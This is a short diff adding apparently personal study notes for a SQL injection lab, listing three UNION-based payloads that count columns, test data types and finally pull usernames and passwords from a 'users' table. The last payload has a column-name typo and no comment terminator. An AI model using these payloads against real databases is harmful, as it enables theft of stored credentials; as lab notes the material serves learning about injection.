@@ -1,0 +1,10 @@
+ Given table name users with columns username,password :
+
+step 1 :finding the colunmns in the query using the previous injection 
+injection used : 'union select null,null-- 
+
+step 2: so we know how many columns next find the data type of those by union 
+injection used : 'union select 'abcd','efgh' --
+
+step 3 :fianlly combine the users tbale using union 
+injection used :' union select usernames,password from users. 
